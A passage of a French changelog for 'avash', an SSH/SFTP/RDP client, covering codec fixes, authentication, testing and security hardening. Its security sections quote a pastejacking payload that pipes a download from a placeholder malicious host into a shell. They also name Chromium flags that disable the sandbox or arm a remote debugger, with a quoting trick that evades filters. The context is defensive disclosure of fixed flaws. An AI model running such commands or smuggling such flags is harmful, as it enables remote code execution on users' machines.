  harnais monte son sshd ; la chaîne construit désormais le serveur RDP de test
  et génère son certificat, sur GitHub comme sur GitLab.
- **Le job Windows compilait l'interface sans le front.** `generate_context!`
  de Tauri exige `web/dist` : le job échouait avant le moindre test. Le front y
  est construit d'abord.
- **Un test d'intégration échouait au hasard.** Chaque serveur SSH de test
  tirait sa propre clé sur un port éphémère, tous partagés dans un même
  `known_hosts` : un port réattribué au serveur d'un test suivant passait pour
  une interception. Une clé commune rend le port indifférent, et le test de clé
  changée retire son leurre derrière lui.
- **Une AppImage extraite était suivie par git** (`squashfs-root/`, 11 Mo)
  depuis la 0.5.0 ; retirée et ignorée. Une note de développement de l'époque
  où le projet s'appelait autrement est supprimée.
- **La clé privée générée naît en 0600.** Elle était écrite avec l'umask puis
  resserrée après coup : la fenêtre était brève, mais c'est le défaut que
  l'écriture atomique ferme déjà pour les fichiers de configuration. La
  création refuse aussi d'écraser un fichier apparu entre-temps.
- **Le processus RDP écrit ses deux fichiers d'état atomiquement.** Le fichier
  des empreintes l'était ; la liste des serveurs à canal graphique, non — une
  coupure l'aurait vidée, et chaque serveur aurait de nouveau coûté une
  reconnexion. Une fonction commune, testée, sert les deux.
- Le dossier de téléchargement par défaut suit `AVASH_HOME` comme le reste du
  cœur ; la borne de redirections du processus RDP dit le vrai nombre de tours.
- **Les chemins que seuls des commentaires décrivaient ont leurs tests.** La
  relecture complète du projet a listé les fonctions sans test direct ; elles
  en ont un. Côté processus RDP : le découpage `DOMAINE\utilisateur` et
  `utilisateur@domaine`, le format binaire des trames envoyé à l'interface
  (type, géométrie, pixels ligne par ligne, et le lot de rectangles), le
  mappage des boutons de souris, la configuration après redirection (les
  identifiants du serveur et son jeton de routage priment). Côté interface :
  la résolution des rebonds `ProxyJump` (alias, `user@hôte:port`, clé de la
  cible reprise, chaîne ordonnée, `none`) et, grâce au moteur d'exécution
  factice de Tauri, le magasin de sessions — fermer un onglet pendant la
  connexion annule l'enregistrement, fermer un onglet sans connexion en vol ne
  sème pas d'annulation, une session plus récente évince l'ancienne sans être
  close par elle, écrire vers une session inconnue est une erreur — et le
  refus d'une adresse RDP à espace avant tout lancement de processus. L'outil
  en ligne de commande, qui n'avait aucun test, est exercé comme binaire :
  `list`, absence de configuration, commande inconnue, `run` incomplet. Le
  front extrait l'expansion des chemins de dossiers, testée.
- **Le hook de pré-commit est versionné** (`scripts/hooks/pre-commit`) : il
  ne vivait que dans le `.git` d'une machine, et un clone neuf n'avait aucune
  des quatre portes en local. `git config core.hooksPath scripts/hooks`
  l'active.
- **Le parseur de `~/.ssh/config` est fuzzé par mutation.** Deux mille
  variantes d'une configuration réaliste — octets retournés, troncatures,
  fragments de mots-clés, octets hostiles — ne doivent ni le faire paniquer
  ni lui faire rendre un hôte incohérent. Première trouvaille : un espace
  collé au nom d'hôte d'un `ProxyJump` (`relais :2200`) traversait le
  découpage et rendait le rebond introuvable ; chaque morceau est rogné.
- **Le processus RDP est découpé en modules.** `rdp-sidecar/src/main.rs`
  (2 700 lignes) ne garde que le point d'entrée ; neuf modules prennent
  chacun un domaine : ligne de commande, connexion et négociation, session
  établie, confiance au serveur, canal local, entrées, trames, presse-papiers,
  capture. Chaque module de test suit le code qu'il exerce ; le texte est
  repris tel quel, seules les visibilités et les imports changent.
- **Le front est découpé en modules.** `web/main.ts` (4 200 lignes) portait
  toute l'application ; il garde le cœur — arbre des hôtes, onglets,
  terminaux, palette, amorçage — et dix-huit modules prennent chacun un
  domaine : état partagé, thème, SFTP, RDP, tunnels, snippets, dialogues,
  notifications, connexion directe, clés, menu d'hôte, dossiers, raccourcis,
  outils du terminal, verrous, barre de titre, mise à jour, panneaux. Le
  texte des sections est repris tel quel ; les seules variables mutées d'un
  module à l'autre ont rejoint l'objet `state`. Le lint, la garde et le
  contrôle couvrent désormais tous les modules, pas une liste de fichiers.
- **Le panneau SFTP n'ouvre plus de seconde connexion SSH.** Il rejouait la
  connexion complète de l'onglet — rebonds, clé d'hôte, authentification —
  pour obtenir un canal que le protocole offre sur la session existante. Il
  ouvre désormais son canal sur la session du terminal : une seule session
  côté serveur, pas de seconde authentification dans les journaux ni refusée
  par une politique de sessions, et le mot de passe n'a plus à rester en
  mémoire pour le rejeu — la cible est oubliée dès la connexion établie. Un
  test d'intégration compte les connexions vues par le serveur : une seule.
- **Les binaires de test de l'interface démarrent sous Windows.** Tauri ne
  pose son manifeste d'application que sur l'exécutable de l'application ; un
  binaire de test qui construit une application factice mourait avant `main`,
  faute des contrôles communs version 6 (bogue amont tauri-apps/tauri#13419).
  Le manifeste est désormais posé par l'éditeur de liens sur chaque
  exécutable du paquet, depuis un fichier unique.
- **Documentation remise au niveau de la 0.6.1** : version, comptes de tests,
  versions supportées dans `SECURITY.md`, trois paquets IronRDP portés et non
  deux, fichiers du chantier GNOME Remote Desktop nommés tels qu'ils existent,
  licence dans les métadonnées du bundle, liens du journal des modifications.

## [0.6.1] - 2026-09-02

- **Plus de carrés noirs quand avash est piloté à travers une session RDP.**
  Vu surtout dans le cas où un avash Windows en pilotait un autre dans une
  session RDP imbriquée : des vignettes vidéo, un canvas ou un aperçu d'onglet
  apparaissaient un instant en noir. WebView2 compose ces tuiles par le GPU,
  dont la surface est virtualisée par le protocole RDP ; la tuile peinte arrive
  parfois avant son contenu, et la double latence d'un RDP imbriqué la fait
  durer assez pour qu'on la remarque. Sous Windows, quand `GetSystemMetrics(SM_REMOTESESSION)`
  indique une session distante, avash bascule la composition de WebView2 en
  logiciel (`--disable-gpu-compositing`) — exactement l'analogue du
  `WEBKIT_DISABLE_COMPOSITING_MODE` déjà posé sous Linux. Aucun effet sur un
  écran physique, où le GPU sert normalement. Une valeur
  `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS` héritée de l'environnement n'est pas
  reprise : avash en prend le contrôle entier (voir « Sécurité »).

- **La fusion des rectangles à redessiner ignorait les paires qui se
  chevauchent.** Passé le plafond de rectangles, le processus RDP fusionne la
  paire dont l'union gaspille le moins de surface. Or deux rectangles qui se
  recouvrent ont une union *plus petite* que la somme de leurs aires : la
  soustraction non signée s'enroulait, la paire recevait un coût quasi infini
  et n'était jamais choisie — c'est pourtant la plus rentable à fusionner. En
  compilation de test, la même soustraction paniquait. Le calcul est saturé à
  zéro, avec un test qui reproduit le cas.

- **L'annonce « port jeton » du processus RDP est analysée par une fonction
  pure, testée.** Un port hors plage ou un jeton manquant sont refusés avec un
  message clair ; et quand le processus s'arrête sans rien annoncer, c'est la
  dernière ligne de son diagnostic qui remonte, pas un message générique.

### Sécurité

- **Le collage applicatif passe enfin par le « bracketed paste ».** Ctrl+Maj+V
  et « Coller » du menu écrivaient les octets bruts du presse-papiers dans le
  terminal distant, court-circuitant l'encadrement `ESC[200~…ESC[201~` que le
  shell distant demande. Une page web piégée pouvait ainsi déposer
  `commande\ncurl http://malveillant|sh\n` dans le presse-papiers et faire
  exécuter la seconde ligne à l'insu de l'utilisateur (pastejacking). Le collage
  passe désormais par `term.paste()`, qui applique l'encadrement, et tout
  collage multi-ligne demande confirmation.
- **avash ne défère plus à `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS`.**
  `--remote-debugging-port`, `--no-sandbox`, `--renderer-cmd-prefix` et
  consorts, posés dans cette variable, arment un débogueur distant, désactivent
  le bac à sable ou font exécuter un binaire arbitraire par la webview — un
  pied local en ferait un pivot. En expurger les drapeaux connus ne suffit pas :
  Chromium redécoupe la ligne de commande après coup, et `--no-sand"box` passe
  n'importe quel filtre avant d'être recomposé. avash impose donc sa propre
  valeur en session distante et retire la variable partout ailleurs.
  Symétriquement, sous Linux, un `WEBKIT_INSPECTOR_SERVER` hérité est
  neutralisé — sauf sous pilotage WebDriver (`TAURI_WEBVIEW_AUTOMATION`), où
  cette variable est le canal de commande de WebKitWebDriver lui-même : la
  retirer là coupait la suite bout en bout.
- **Les traces `AVASH_RDP_TRACE` ne remontent plus à l'interface.** Elles
  portent le mot de passe en clair (CredSSP) ; depuis le journal de diagnostic,
  l'interface captait `stderr` et l'affichait dans l'incrustation de fermeture —
  le secret pouvait partir dans une capture d'écran jointe à un rapport de bug.
  Elles vont maintenant dans un fichier dédié en `0600`, dont seul le chemin est
  annoncé. Ce fichier porte un nom imprévisible (aléa de 64 bits, pas seulement
  le PID) et s'ouvre en `create_new` + `O_NOFOLLOW` : `/tmp` est inscriptible
  par tous, et un nom devinable ouvert en simple `create` aurait suivi un lien
  symbolique planté d'avance par un autre compte — jusqu'au fichier de son
  choix (CWE-59).
- **Poignée de main WebSocket du processus RDP durcie.** Chaque validation se
  fait désormais dans sa propre tâche (un client muet ne bloque plus la file —
  c'était un déni de service par une page web ou un processus local), l'origine
  est vérifiée en refusant par défaut — seuls `localhost` et le schéma
  `tauri://` passent, quelle qu'en soit la casse ; `file://`, `null` ou `data:`
  sont rejetés au lieu d'être admis faute d'être reconnus —, et le jeton est
  comparé en temps constant.
- **La chaîne d'intégration ferme trois portes de plus.** `cargo deny check
  advisories` est enfin appelé (la section `[advisories]` ne servait à rien),
  `cargo audit` échoue désormais sur les défauts de sûreté (`--deny unsound`),
  `npm audit` couvre le front (le vrai périmètre de confiance), et le code
  spécifique Windows de l'interface est compilé et testé en CI au lieu de ne
  l'être qu'à la publication.

### Performance

- **Moins d'allocations sur le chemin chaud du décodage graphique.** Le message
  multi-rectangles réserve sa capacité d'avance (fini le doublement d'un tampon
  multi-mégaoctets, image après image), la conversion BGRA→RGBA aussi — et,
  pour la sortie ClearCodec, elle se fait sur place, sans second tampon plein
  écran par image —, et le drapeau de trace n'est plus relu de l'environnement
  à chaque PDU. Côté
  interface, le rectangle du canvas n'est plus recalculé à chaque mouvement de
  souris (un reflow forcé jusqu'à mille fois par seconde), mais mémorisé et
  invalidé au besoin.

## [0.6.0] - 2026-09-01

- **Le canal graphique fonctionne aussi avec Windows.** Éprouvé contre deux
  serveurs réels — un contrôleur de domaine et un hôte RDP —, dont le bureau
  s'affiche désormais intégralement par ce chemin. Il fallait pour cela quatre
  choses que la 0.5.0 n'avait pas :

  - **ClearCodec**, que Windows emploie pour l'essentiel de son dessin. Le
    décodeur d'IronRDP lisait `shortVBarYOn` et `shortVBarYOff` dans l'ordre
    inverse de la spécification : `yOn` sur huit bits dépassant presque toujours
    `yOff` sur six, le contrôle de cohérence rejetait *chaque* image. Le paquet
    `ironrdp-pdu` est donc porté à son tour. Le test amont qui couvrait cette
    fonction encodait le même défaut — son attente était dérivée de la même
    lecture inversée — et passait donc au vert pendant que le codec refusait
    tout.

  - **Le cache de surfaces**, que Windows sollicite massivement : six cent
    quarante et une reprises pour dix-huit dépôts sur une seule ouverture de
    session. Le compteur de points de destination est un entier seize bits ; lu
    sur huit, il valait presque toujours zéro et le bureau s'affichait troué.

  - **Le progressif affiné par paliers de qualité** (`TILE_FIRST` puis
    `TILE_UPGRADE`), là où GNOME Remote Desktop se contente de tuiles simples.
    L'état de chaque tuile est conservé dans le domaine des fréquences, la
    transformée en ondelettes travaillant sur une copie.

  - **Les remplissages unis et les recopies entre surfaces**, plus le
    rattachement de surface à une sortie mise à l'échelle.

- **Le processus RDP annonce ses capacités même face à un serveur muet.** La
  boucle de capture n'écrivait qu'à la réception d'un PDU ; un serveur Windows
  qui attend le canal graphique n'envoie plus rien du tout, et l'annonce ne
  partait jamais. Le silence est précisément le moment où il faut parler.

- Une session Windows réelle est **enregistrée au magnétoscope**. Avec celle de
  GNOME Remote Desktop, elle couvre hors ligne les deux moitiés disjointes du
  décodeur graphique, et alimente le fuzzing par mutation.

- **Trois cent soixante-treize tests supplémentaires ne s'exécutaient nulle
  part** : `ironrdp-pdu` portait lui aussi « test = false ». Le garde-fou
  éprouve maintenant les trois paquets portés depuis leur propre répertoire —
  `cargo test -p` refuse en silence un paquet qui a des dépendances de
  développement sans appartenir à l'espace de travail.

- **L'audit d'accessibilité auditait une modale encore en mouvement.** Il
  héritait du gel des animations posé par le test précédent, et mesurait le
  contraste d'un texte composé sur un fond translucide. Le détail de la
  violation, jusque-là confié à un `console.log` que le journal d'intégration
  continue ne retenait pas, est désormais porté par l'assertion.

## [0.5.0] - 2026-09-01

- **avash affiche enfin les bureaux GNOME Remote Desktop.** SLED 16 se connecte,
  s'affiche et se redimensionne. Trois défauts se cachaient l'un derrière
  l'autre, et chacun masquait le suivant.

  - **Les redirections de serveur sont suivies, RDSTLS compris.** Ces serveurs
    remettent la connexion d'un démon à l'autre par une redirection portant un
    jeton de routage et des identifiants à usage unique, que seul RDSTLS sait
    consommer.

  - **Le canal graphique (MS-RDPEGFX) est ouvert et son flux décodé.** Ces
    serveurs ne dessinent que par là. Notre annonce de capacités portait
    l'identifiant `0x0011` — celui de `CacheImportReply` — au lieu de `0x0012` :
    un message parfaitement formé, mais qui parlait d'autre chose. Le serveur
    l'ignorait, attendait dix secondes, puis fermait la session sur un
    `BadCapabilities` désignant la mauvaise cause. Trouvé en comparant nos
    octets à ceux de FreeRDP sur une capture déchiffrée.

  - **Le codec RemoteFX Progressive est implémenté** (`progressif.rs`) : c'est
    celui que ces serveurs retiennent dès lors que le client n'annonce pas
    H.264. Les tuiles sont décodées, rognées sur les bords de la surface, et
    reportées à l'écran.

  - **Le redimensionnement suit.** Redimensionner la fenêtre d'avash fait
    re-rendre le bureau distant à la nouvelle taille, comme sur un serveur
    Windows : le serveur répond par un `ResetGraphics` que le client applique à
    son image et annonce à l'interface.

- **Le canal graphique s'apprend serveur par serveur.** Un serveur Windows
  dessine par le chemin classique dès l'activation, et **le seul fait
  d'accepter le canal graphique le fait taire** : il tient alors pour acquis que
  le client dessinera par là, et bascule sur des codecs que nous ne décodons
  pas. L'écran deviendrait noir là où il fonctionnait — vérifié, puis corrigé.
  Le client refuse donc le canal par défaut ; si la session se termine sans
  qu'une image ait été affichée, il se reconnecte en l'acceptant et le retient
  dans `~/.config/avash/rdp_canal_graphique`. La reconnexion ne se paie qu'une
  fois par serveur. `AVASH_EGFX=toujours` ou `jamais` tranche à la main.

- **Une redirection ne coupe plus l'interface.** Le processus RDP rouvrait un
  serveur WebSocket que l'application ne suivait pas : la session distante se
  rétablissait dans le vide.

- **Deux paniques déclenchables à distance sont fermées.** Le fuzzing par
  mutation, étendu au chemin graphique, a montré qu'un flux corrompu pouvait
  arrêter le processus depuis la décompression ZGFX comme depuis la conversion
  des couleurs — donc couper toutes les sessions ouvertes, pas seulement la
  sienne. Une image illisible reste une image illisible.

- **Quatorze tests ne s'exécutaient nulle part.** Les paquets IronRDP
  vendorisés portaient `test = false`, hérité du dépôt amont : les tests
  couvrant nos propres correctifs — décalage des tuiles, redirection, capacités
  précoces — passaient pour verts sans jamais tourner, ni en local ni en
  intégration continue.

- Une session GNOME Remote Desktop réelle est **enregistrée au magnétoscope** et
  son rendu figé par empreinte. C'est la seule couverture hors ligne de ce
  chemin, le parc conteneurisé ne sachant toujours pas monter un tel serveur.

## [0.4.3] - 2026-09-01

- **`os error 10054` couvrait un second cas, non traité.** Une coupure pendant
  l'établissement du canal chiffré — après une négociation pourtant acceptée —
  affichait encore le code brut. C'est le symptôme d'un certificat RDP absent ou
  abîmé côté serveur, ou d'une couche de sécurité réglée sur « RDP » au lieu de
  « SSL ». Le message le dit maintenant, et précise que renoncer à NLA n'y
  changerait rien puisque ce repli passe lui aussi par TLS.

- **Le flux RDP peut être lu en clair.** `scripts/tracer-rdp.sh` capture une
  session et la déchiffre PDU par PDU, en s'appuyant sur `SSLKEYLOGFILE` — une
  capacité que la pile TLS offrait depuis toujours sans que personne l'emploie.
  Complément du magnétoscope : l'un rejoue ce qu'on a compris, l'autre montre ce
  qui passe réellement.

- Le parc éprouve désormais **SFTP contre un vrai OpenSSH** : dépôt, relecture à
  l'octet près, effacement. Les tests d'intégration parlaient à un serveur monté
  en mémoire, c'est-à-dire à notre propre compréhension du protocole.
- Un test garde le drapeau EGFX annoncé. GNOME Remote Desktop ne peut pas être
  mis en conteneur — son démon n'ouvre aucun port sans session GNOME complète —
  et cette limite est écrite noir sur blanc plutôt que découverte plus tard.

- **GNOME Remote Desktop : la connexion aboutit enfin.** Ces serveurs exigent que
  le client annonce le pipeline graphique ; sans ce drapeau, ils ferment la
  connexion avant même d'envoyer `ServerDemandActive`, sans la moindre
  explication. Vérifié dans les deux sens : la connexion aboutit désormais, et
  les serveurs qui fonctionnaient déjà rendent leur image exactement comme
  avant.
- **Le PDU de redirection de serveur est décodé** (MS-RDPBCGR 2.2.13.1.1), que
  la bibliothèque rejetait. avash lit la demande — jeton de routage compris —
  mais ne sait pas encore la suivre : ces serveurs n'envoient leurs images que
  par EGFX, non implémenté. Plutôt qu'un écran vide, avash nomme la limite.

## [0.4.1] - 2026-09-01

- **« os error 10054 » remplacé par une phrase utile.** Un serveur RDP qui ferme
  la connexion sans répondre donnait ce code brut sous Windows (`WSAECONNRESET`,
  `os error 104` sous Unix), que rien ne permettait d'interpréter. avash dit
  maintenant ce qu'il sait — le serveur a coupé sans répondre — et ce qu'il
  ignore : cela ressemble à un serveur qui n'accepte pas NLA, mais un pare-feu
  ou un service qui n'est pas du RDP donneraient la même chose. La voie « sans
  NLA » est proposée, comme pour un refus explicite.
- La même coupure survenant *pendant* une session est reconnue et expliquée au
  lieu d'afficher le code système.

- Le message affiché quand un serveur accepte les identifiants puis met fin à la
  session ne suppose plus de cause. Il dit ce qui est établi — l'authentification
  a réussi, la session ne démarre pas côté serveur — et renvoie au journal qui,
  lui, sait pourquoi.
- L'audit d'accessibilité attend que la liste soit redessinée après une bascule
  de thème avant de mesurer. Sans cela il relevait des couleurs transitoires.

## [0.4.0] - 2026-09-01

Une capacité nouvelle — enregistrer le dialogue d'un serveur pour le rejouer —
qui a immédiatement mis au jour **deux façons pour un serveur RDP de faire
tomber le client**. Plus la moitié des octets d'affichage économisés, et des
contrastes enfin conformes dans les deux thèmes.

### Sécurité

- **Un serveur hostile ne fait plus tomber le client.** Deux défauts trouvés par
  fuzzing par mutation à partir de trafic authentique : une écriture hors du
  tampon d'image quand le serveur annonce plus de lignes que le rectangle n'en
  contient — six chemins de décodage ne bornaient rien — et un débordement
  arithmétique sur un rectangle dont les bords sont dans le désordre. Rust
  arrête l'écriture, donc pas de corruption mémoire ; mais le processus mourait,
  emportant une session établie. Voir SECURITY.md.

- Le processus RDP est éprouvé contre des messages malformés : vingt mille
  messages aléatoires et tous les types connus tronqués à toutes les longueurs.
  Le canal local est authentifié par jeton, mais un client authentifié reste un
  client — un bogue d'interface suffirait à envoyer n'importe quoi, et une
  analyse qui panique ferait tomber une session déjà établie.

- **Contrastes insuffisants corrigés dans les deux thèmes.** Un audit `axe-core`
  sur l'application réelle a trouvé un texte secondaire à 3,15:1 au lieu de 4,5,
  des initiales d'avatar à 4,44, un champ sans étiquette visible et un rôle ARIA
  interdit sur un `<form>`. Le thème clair était pire — 2,45:1 — et aucun test
  ne l'aurait montré, tous tournant en sombre. L'audit fait désormais partie de
  la suite, sur les deux thèmes.

- **L'affichage RDP envoyait deux fois trop d'octets.** Le processus n'accumulait
  qu'une union englobante des zones modifiées : deux poussières aux coins
  opposés donnaient un rectangle plein écran. Les zones restent désormais
  séparées, et ne fusionnent que si l'union coûte moins cher que les deux.
  Mesuré sur le fil contre un vrai xrdp, même parcours : **8,39 Mo → 4,36 Mo**,
  avec davantage de trames livrées. Un contrôle de conformité empêche le retour
  en arrière.

### Outillage — combler l'angle mort qui a laissé passer trois défauts

- **Parc RDP local** (`tests-parc/`) : de vrais serveurs xrdp en conteneur, avec
  deux bureaux (XFCE et GNOME) parce qu'ils ne dessinent pas de la même façon.
  Trois contrôles, un par défaut réellement rencontré : la connexion aboutit,
  l'image n'est pas cisaillée, la disposition clavier annoncée n'est pas zéro.
  Vérifié : en désactivant le correctif porté, le parc reproduit le
  cisaillement et le détecteur le voit.
- **Intégration continue GitLab** (`.gitlab-ci.yml`) : jusqu'ici GitLab recevait
  chaque poussée sans rien vérifier. La chaîne reprend celle de GitHub. Il
  manque un exécuteur, voir CONTRIBUTING.md.
- **`cargo deny`** sur les deux arbres de dépendances : licences, dépendances en
  joker, sources hors registre — trois portes qu'`audit` ne regarde pas.
  `publish = false` sur les trois crates : rien n'est destiné à crates.io.
- **Traces du processus RDP** sur `AVASH_RDP_TRACE`, et non `RUST_LOG` : elles
  contiennent le mot de passe en clair, elles ne doivent pas s'allumer par
  accident.
- Les correctifs portés sur IronRDP ont leurs tests exécutés par les quatre
  portes : sans cela, une montée de version pourrait les défaire en silence.
- **Conformité SSH** : un sshd du parc refuse la méthode `password` et n'accepte
  que `keyboard-interactive` — le comportement d'un hôte joint à un annuaire.
  C'est le défaut signalé depuis Windows, désormais éprouvé contre un vrai
  serveur. Contrôle négatif fait : en débranchant le repli, le test échoue avec
  le message exact que voyait l'utilisateur.

- **Une connexion RDP pouvait rester suspendue en pleine séquence, après une
  authentification réussie.** La détection automatique des caractéristiques
  réseau attend des résultats de mesure de bande passante ; IronRDP ne les
  envoyait pas, en supposant que le serveur poursuivrait sans. Un serveur du
  parc de test attend bel et bien. La mesure est désormais faite et renvoyée.
  Correctif porté dans `rdp-sidecar/vendor/`.

- Le message d'erreur de fin de connexion n'accuse plus NLA à tort. Un serveur
  qui accepte les identifiants puis met fin à la session le dit maintenant en
  clair, au lieu d'afficher « finalisation (CredSSP/NLA) ».

## [0.3.3] - 2026-08-31

Trois défauts RDP trouvés en une soirée, tous contre de vraies machines du parc
de test, tous signalés par l'usage réel avant d'être cherchés dans le code.

- **Le clavier était interprété en QWERTY sur les serveurs xrdp.** RDP
  transporte des scancodes, pas des caractères : c'est le serveur qui les
  traduit, d'après la disposition que le client annonce. avash annonçait 0 ;
  xrdp en déduisait un clavier américain, et taper « a » produisait « q ».
  La disposition du poste est maintenant détectée (`XKB_DEFAULT_LAYOUT`, la
  configuration KDE, puis `localectl` ; le registre sous Windows), et
  `--layout` permet de l'imposer.

- **L'affichage RDP partait en biais sur les serveurs xrdp.** RDP autorise un
  bitmap plus large que le rectangle où il se pose ; xrdp s'en sert, en
  annonçant par exemple 340 pixels pour un rectangle de 337. Le décodeur
  d'IronRDP écrivait à la largeur du bitmap puis relisait à celle du rectangle :
  chaque ligne glissait de la différence, et l'image se cisaillait en diagonale.
  Le chemin non compressé retirait bien ce remplissage, les chemins compressés
  non. Correctif porté dans `rdp-sidecar/vendor/`, à retirer quand l'amont
  corrigera.

- Le processus RDP honore `AVASH_HOME` comme le cœur. Sous Windows, l'API qui
  donne le répertoire de configuration ignore `HOME` et `XDG_CONFIG_HOME` : la
  suite bout en bout y aurait écrit dans le fichier de confiance RDP réel.

## [0.3.2] - 2026-08-31

Six correctifs, dont trois trouvés en confrontant le code à de vraies machines
plutôt qu'à des serveurs de test.

### Interne

- **Le téléchargement SFTP en bandes parallèles est désormais mesuré, plus
  seulement déduit.** Il avait été écrit et validé contre le serveur de test du
  dépôt, qui ne reproduit ni les limites annoncées par OpenSSH ni son
  comportement avec plusieurs descripteurs sur un même fichier. Éprouvé contre
  un vrai `internal-sftp` (`examples/sftp_probe.rs`) : octets identiques à
  toutes les latences, et un gain de 6,3 × à 7,1 × entre 10 et 60 ms
  d'aller-retour — ~2 × en réseau local, où la latence n'est plus le facteur
  limitant. L'estimation théorique annoncée jusqu'ici était du bon ordre.

### Corrigé

- **RÉGRESSION de la 0.3.1 : les serveurs RDP sans NLA étaient devenus
  injoignables.** En exigeant l'authentification réseau — le correctif qui
  empêche un serveur d'obtenir le mot de passe sans s'authentifier —, avash
  refusait aussi des serveurs légitimes qui ne savent pas la faire : un bureau
  Linux servi par xrdp sans module PAM, typiquement. Constaté contre un vrai
  parc : sur quatre serveurs, trois négocient NLA et un le refuse.

  NLA reste exigé par défaut. Quand le serveur le refuse, avash le dit et
  **propose de se connecter quand même**, en expliquant ce que cela coûte et ce
  que cela ne coûte pas : le mot de passe part alors dans un canal chiffré sans
  que le serveur se soit authentifié au préalable, mais son empreinte reste
  épinglée — dès la connexion suivante, un imposteur est refusé. Le risque ne
  porte que sur le premier contact, exactement comme pour une clé d'hôte SSH.
  Le choix est retenu par serveur, jamais globalement.

- **Une tentative de connexion RDP pouvait rester pendue indéfiniment.** Constaté
  contre un xrdp qui annonce NLA sans jamais mener l'échange CredSSP à son
  terme : TLS monte, les données circulent, et rien n'aboutit — l'onglet reste
  figé sans un mot. La tentative est désormais bornée à 25 secondes, et le
  message distingue les deux cas : un serveur qui refuse NLA d'emblée, et un
  serveur qui l'annonce sans savoir le mener à bien.

- **Un hôte enregistré puis connecté dans la foulée portait le mauvais titre.**
  L'onglet s'intitulait « utilisateur@adresse » au lieu de l'alias saisi, et la
  session n'était rattachée à aucune ligne de la barre latérale — voyant éteint,
  menu qui ne la reconnaissait pas. Il fallait fermer l'onglet et se reconnecter
  depuis la liste pour retrouver le bon nom. Deux causes : l'onglet était nommé
  avant que l'alias ne soit connu, et le cœur écrasait ensuite ce nom par le
  sien, qui est toujours « utilisateur@adresse ».
- **Le bureau RDP pouvait rester sans focus clavier** après la fermeture d'un
  onglet SSH voisin : il redevenait visible et actif, mais les frappes ne
  partaient nulle part. Le `focus()` était posé dans la même tâche que le
  passage de `display: none` à visible, ce qui n'aboutit pas toujours — un
  élément dont la disposition n'est pas encore calculée n'est pas focalisable.
  Une seconde tentative a lieu à l'image suivante si la première n'a pas pris.

- **Générer une clé SSH échouait systématiquement sous Windows.** La ligne de
  commande passée à `icacls` collait `/grant:r` au nom du compte
  (`/grant:rutilisateur:F`), ce qu'`icacls` rejette : « Invalid parameter ». Ce
  sont deux arguments distincts. Sur une machine sans `~/.ssh`, lister les clés
  échouait pour la même raison. Un répertoire reçoit désormais aussi les
  marqueurs d'héritage `(OI)(CI)` — l'héritage du parent venant d'être coupé,
  un fichier créé ensuite dans `~/.ssh` n'aurait hérité d'aucune autorisation.

  La fonction concernée portait un commentaire affirmant qu'elle était « isolée
  du reste pour être vérifiable par un test » — elle n'en avait aucun. Ce sont
  les tests Windows, activés la veille, qui l'ont attrapée.


## [0.3.1] - 2026-08-31

### Corrigé

- **Impossible de se connecter en SSH à un hôte joint à un annuaire** (Active
  Directory via SSSD/PAM), avec un compte de la forme `DOMAINE\utilisateur`.
  Le message était « Authentification échouée », alors que le mot de passe était
  bon. La cause : ces hôtes désactivent presque toujours
  `PasswordAuthentication` et confient la conversation à PAM, en
  **`keyboard-interactive`**. OpenSSH bascule tout seul sur cette méthode ;
  Avash ne la connaissait pas et s'arrêtait au premier refus. Signalé par
  l'usage réel sous Windows.

  Avash répond désormais aux invites masquées avec le mot de passe déjà saisi,
  sur autant de tours que le serveur en pose. Une invite **en clair** — code à
  usage unique, question de sécurité — n'est pas remplie à l'aveugle : y envoyer
  le mot de passe le livrerait à l'écran du serveur sans aboutir. Avash renonce
  alors en citant ce qui était demandé.

- **Un échec d'authentification ne disait pas sa cause.** Le serveur indique les
  méthodes qu'il accepte encore ; nous le taisions. Le message les nomme
  maintenant, ce qui distingue « mauvais mot de passe » de « cette méthode n'est
  pas proposée » — deux situations qui appellent des gestes opposés.

### Interne

- **Aucun test ne s'exécutait sous Windows.** Le job d'intégration continue se
  contentait d'un `cargo check` sur le cœur. C'est l'angle mort qui a laissé
  passer le défaut ci-dessus : ce sont les tests d'intégration — un vrai serveur
  SSH monté en mémoire — qui l'auraient attrapé, et ils tournent aussi bien sur
  Windows. Ils y tournent désormais, ainsi que ceux du processus RDP.
- Le serveur SSH de test sait conduire une conversation PAM (invite unique,
  invites multiples, invite en clair), et vérifie qu'un compte
  `DOMAINE\utilisateur` lui arrive intact.


## [0.3.0] - 2026-08-31

Deux multi-audits complets — fiabilité, sécurité, performance, ergonomie, puis
qualité des tests — et les corrections qui en découlent. Le second audit avait
pour première mission de vérifier ce que le premier cycle avait cassé ; il a
trouvé cinq régressions, toutes corrigées ici.

### Sécurité

- **La clé d'hôte SSH n'était pas réellement vérifiée.** `check_known_hosts` de
  russh répond « hôte inconnu » quand seul l'algorithme diffère : une clé
  changée passait donc pour un premier contact et était réapprise en silence.
- **Le certificat du serveur RDP n'était pas vérifié du tout** — la bibliothèque
  installe `NoCertificateVerification`. L'empreinte SHA-256 de la clé publique
  est désormais épinglée, et la vérification précède CredSSP : après, les
  identifiants seraient déjà partis.
- **Le repli vers TLS seul était accepté en RDP.** En annonçant `PROTOCOL_SSL`,
  nous disions au serveur accepter de sauter NLA ; un serveur répondant « SSL »
  recevait alors le mot de passe dans le Client Info PDU, sans authentification
  mutuelle. Seul HYBRID est désormais annoncé.
- **Les marqueurs `@revoked` et `@cert-authority` de `known_hosts` étaient
  ignorés** : une clé marquée comme compromise était réapprise et acceptée, là
  où `ssh(1)` refuse catégoriquement.
- **Le processus RDP était cherché en chemin relatif** en dernier recours.
  Lancée depuis un répertoire partagé, l'application y aurait exécuté le binaire
  qu'on y avait déposé — en lui écrivant le mot de passe RDP sur l'entrée
  standard.
- **Trois allocations sans plafond**, toutes pilotables par un serveur distant :
  la sortie d'une commande (la sonde d'OS part à chaque ouverture d'onglet) et
  la résolution annoncée par un serveur RDP (17 Gio pour un 65535×65535).
- **Le presse-papiers** n'est plus poussé au simple retour de fenêtre, le
  réglage vaut dans les deux sens, et il est révocable (Ctrl+K).
- **Le mot de passe RDP** ne traverse plus l'interface, y compris à la première
  connexion.
- Écritures atomiques pour `~/.ssh/config`, `known_hosts`, `rdp_known_hosts` et
  les fichiers de configuration : la troncature précédait l'écriture, et une
  coupure laissait un fichier vide.
- Trois commandes exposées à l'interface sans être utilisées ont été retirées.

### Corrigé

- Le téléchargement SFTP **détruisait le fichier local avant de savoir s'il
  aboutirait**, et pouvait laisser un fichier tronqué portant le bon nom.
- Fermer un onglet ignorait l'existence de l'autre type d'onglet : zone centrale
